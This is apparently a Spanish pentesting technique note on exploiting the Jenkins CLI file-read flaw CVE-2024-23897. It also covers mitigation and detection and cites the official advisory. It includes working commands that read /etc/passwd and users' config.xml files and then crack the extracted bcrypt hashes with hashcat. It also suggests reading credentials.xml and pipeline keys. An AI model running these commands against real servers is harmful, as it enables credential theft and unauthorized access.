---
topic: Lectura de archivos con la CLI de Jenkins
tags: [linux, jenkins, cve, file-read, credentials]
---

# Lectura de archivos con la CLI de Jenkins

[🌐 English](jenkins-cli-file-read.en.md) | **Español**

## Concepto

La CLI de Jenkins interpreta argumentos que empiezan por `@` como rutas de archivo y sustituye su contenido. En versiones afectadas por CVE-2024-23897, un comando que espera un texto devuelve el contenido de un archivo arbitrario, lo que permite leer configuraciones y hashes.

## Cuándo aplica

- El puerto `8080` muestra Jenkins y la versión es anterior a la corrección.
- `jnlpJars/jenkins-cli.jar` es descargable.
- Existe una cuenta de usuario cuyo `config.xml` puede contener un hash.

## Procedimiento

1. Descargar la CLI y listar los comandos disponibles.
2. Probar `@/etc/passwd` en un argumento de texto.
3. Leer `/var/jenkins_home/users/<user>_*/config.xml` y extraer el hash bcrypt.
4. Crackear con `hashcat -m 3200` y acceder al panel.

```bash
java -jar jenkins-cli.jar -s http://<IP>:8080/ help
java -jar jenkins-cli.jar -s http://<IP>:8080/ connect-node @/etc/passwd
java -jar jenkins-cli.jar -s http://<IP>:8080/ connect-node @/var/jenkins_home/users/jennifer_*/config.xml
hashcat -m 3200 hash.txt rockyou.txt
```

## Variantes

- Usar otro comando que acepte texto libre si `connect-node` está restringido.
- Leer `credentials.xml` o claves de pipelines.
- Combinar la lectura con una credencial SSH almacenada.

## Limitaciones

- La CLI debe estar habilitada y accesible.
- La versión debe ser vulnerable.
- Los archivos deben ser legibles por el usuario de Jenkins.

## Mitigación y detección

- Actualizar Jenkins a una versión corregida.
- Deshabilitar la CLI remota y restringir `8080`.
- Rotar credenciales y revisar accesos a `config.xml`.

## Referencias

- <https://nvd.nist.gov/vuln/detail/CVE-2024-23897>
- <https://www.jenkins.io/security/advisory/2024-01-24/>
- <https://attack.mitre.org/techniques/T1552/001/>
